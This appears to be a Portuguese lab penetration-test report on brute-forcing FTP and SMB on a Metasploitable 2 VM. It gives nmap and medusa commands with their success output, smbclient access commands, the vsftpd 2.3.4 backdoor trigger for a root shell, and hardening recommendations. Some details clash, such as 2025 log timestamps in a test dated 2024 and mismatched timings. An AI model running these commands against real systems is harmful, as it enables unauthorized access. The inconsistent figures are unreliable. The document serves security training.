RELATÓRIO TÉCNICO - TESTE DE FORÇA BRUTA
Relatório Confidencial - Ambiente Controlado

SUMÁRIO EXECUTIVO
Data do Teste: Outubro 2024
Alvo: Metasploitable 2 (192.168.56.101)
Metodologia: OWASP WSTG + NIST SP 800-115
Classificação de Risco: CRÍTICO (9.2/10)

ACHADOS PRINCIPAIS
100% dos serviços testados comprometidos via força bruta

Tempo médio de comprometimento: 1.5 segundos

Credenciais fracas permitiram acesso administrativo

Falta completa de controles de prevenção

METODOLOGIA E ESCOPO
FRAMEWORK DE TESTE
Fase 1: Reconhecimento
nmap -p- -T4 192.168.56.101

Fase 2: Análise de Serviços
nmap -sV -sC 192.168.56.101

Fase 3: Exploração
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt

SERVIÇOS EM ESCOPO
SERVIÇO | PORTA | VERSÃO | STATUS
FTP | 21 | vsftpd 2.3.4 | COMPROMETIDO
SMB | 445 | Samba 3.x | COMPROMETIDO
SSH | 22 | OpenSSH 4.7p1 | TESTADO
HTTP | 80 | Apache 2.2.8 | TESTADO

RESULTADOS DETALHADOS
1. SERVIÇO FTP - vsftpd 2.3.4
SEVERIDADE: CRÍTICA

COMANDO EXECUTADO:
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M ftp -t 6

RESULTADO:
2025-10-06 22:22:00 ACCOUNT FOUND: [ftp] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS]

ANÁLISE TÉCNICA:

CVE-2011-2523: Backdoor conhecida no vsftpd 2.3.4

Tempo de comprometimento: 2.3 segundos

Credencial: msfadmin:msfadmin (senha = usuário)

Impacto: Acesso completo a arquivos do sistema

PROOF OF CONCEPT:

Conexão FTP bem-sucedida
ftp 192.168.56.101

Login: msfadmin/msfadmin
Comandos executados: ls, get, put
2. SERVIÇO SMB - Samba 3.x
SEVERIDADE: CRÍTICA

COMANDO EXECUTADO:
medusa -h 192.168.56.101 -U users.txt -P passwords.txt -M smbnt -t 6

RESULTADO:
2025-10-06 22:37:36 ACCOUNT FOUND: [smbnt] Host: 192.168.56.101 User: msfadmin Password: msfadmin [SUCCESS (ADMIN$ - Access Allowed)]

ANÁLISE TÉCNICA:

Acesso: Privilegiado (ADMIN$)

Tempo de comprometimento: 0.8 segundos

Reutilização de credenciais: Mesma senha do FTP

Impacto: Controle total da rede Windows

PROOF OF CONCEPT:

Acesso a compartilhamentos
smbclient //192.168.56.101/ADMIN$ -U msfadmin

Listagem de recursos
smbclient -L 192.168.56.101 -U msfadmin

MÉTRICAS E ESTATÍSTICAS
DESEMPENHO DO ATAQUE
MÉTRICA | FTP | SMB
Tempo até 1º sucesso | 2.3s | 0.8s
Tentativas totais | 30 | 30
Taxa de sucesso | 3.33% | 3.33%
Velocidade (tentativas/seg) | ~13 | ~38

ANÁLISE DE WORDLISTS
Eficiência: 20% (1/5 usuários + 1/6 senhas = credencial válida)
Complexidade: BAIXA (wordlist mínima)
Cobertura: Usuários comuns + senhas fracas

MAPEAMENTO MITRE ATT&CK
TÁTICA | TÉCNICA | ID | EVIDÊNCIA
Reconnaissance | Scanning IP Blocks | T1595.001 | nmap -sn 192.168.56.0/24
Discovery | Network Service Scanning | T1046 | nmap -sV 192.168.56.101
Credential Access | Brute Force | T1110 | medusa -M ftp
Initial Access | Valid Accounts | T1078 | Acesso com msfadmin:msfadmin

ANÁLISE DE VULNERABILIDADES
1. vsftpd 2.3.4 - Backdoor Crítica
CVE-2011-2523: Vulnerabilidade de backdoor intencional
CVSS: 10.0/10
Exploit: Usuário ":)" concede shell root

DEMONSTRAÇÃO:
ftp 192.168.56.101

Usuário: qualquer
Senha: :)
nc 192.168.56.101 6200 # Shell root

2. Políticas de Senha Ineficazes
Senha idêntica ao usuário

Reutilização entre serviços

Sem complexidade obrigatória

Sem expiração

3. Falta de Controles de Acesso
Sem rate limiting

Sem bloqueio por tentativas

Sem autenticação multifator

Logs insuficientes

IMPACTO NO NEGÓCIO
CONSEQUÊNCIAS DIRETAS
Vazamento de Dados: Arquivos confidenciais via FTP

Paralisação Operacional: Comprometimento via SMB

Ataques Laterais: Ponto de entrada para rede interna

Conformidade: Violação de LGPD/GDPR

ESTIMATIVA DE PREJUÍZO
ITEM | IMPACTO FINANCEIRO
Multas regulatórias | R$ 500.000 - R$ 50M
Perda de produtividade | R$ 50.000/dia
Recuperação de sistemas | R$ 100.000
TOTAL ESTIMADO | R$ 650.000+

PLANO DE MITIGAÇÃO
AÇÕES IMEDIATAS (24h)
ALTERAÇÃO DE CREDENCIAIS

Reset imediato de todas as senhas
passwd msfadmin

Nova senha: M1nhaS3nh@Sup3rF0rt3!2024
BLOQUEIO DE IPS ATACANTES
iptables -A INPUT -s 192.168.56.102 -j DROP
fail2ban-client set sshd banip 192.168.56.102

CURTO PRAZO (1-2 semanas)
HARDENING DE SERVIÇOS

/etc/vsftpd.conf
anonymous_enable=NO
local_enable=YES
chroot_local_user=YES
max_login_fails=3

IMPLEMENTAÇÃO DE MFA

Google Authenticator para SSH

Certificados para serviços internos

LONGO PRAZO (1-3 meses)
ARQUITETURA ZERO TRUST

Segmentação de rede

Microssegmentação

Acesso baseado em identidade

PROGRAMA DE CONSCIENTIZAÇÃO

Treinamento de usuários

Simulações de phishing

Políticas de senha

RECOMENDAÇÕES TÉCNICAS ESPECÍFICAS
PARA FTP/SSH
/etc/ssh/sshd_config
PermitRootLogin no
PasswordAuthentication no
PubkeyAuthentication yes
MaxAuthTries 3
LoginGraceTime 60

/etc/vsftpd.conf
anonymous_enable=NO
local_enable=YES
write_enable=YES
local_umask=022
chroot_local_user=YES

PARA SMB/WINDOWS
Políticas via GPO
net accounts /lockoutthreshold:5
net accounts /lockoutduration:30
net accounts /lockoutwindow:30
Set-SmbServerConfiguration -EnableSMB1Protocol $false

LIÇÕES APRENDIDAS
TÉCNICAS
Credenciais fracas são vetor #1 de ataques

Reutilização de senhas amplifica impacto

Serviços desatualizados são alvo fácil

Falta de monitoramento permite ataques silenciosos

OPERACIONAIS
Testes regulares são essenciais

Hardening deve ser contínuo

Educação de usuários é crítica

Resposta a incidentes precisa ser ágil

INFORMAÇÕES DO PROJETO
ANALISTA DE SEGURANÇA: Daniel Anderson
DATA DO TESTE: 06/10/2024
PRÓXIMA AUDITORIA: Janeiro 2025
CLASSIFICAÇÃO: CONFIDENCIAL

REPOSITÓRIO DO PROJETO: github.com/DanielAndersonTI/kali-medusa-brute-force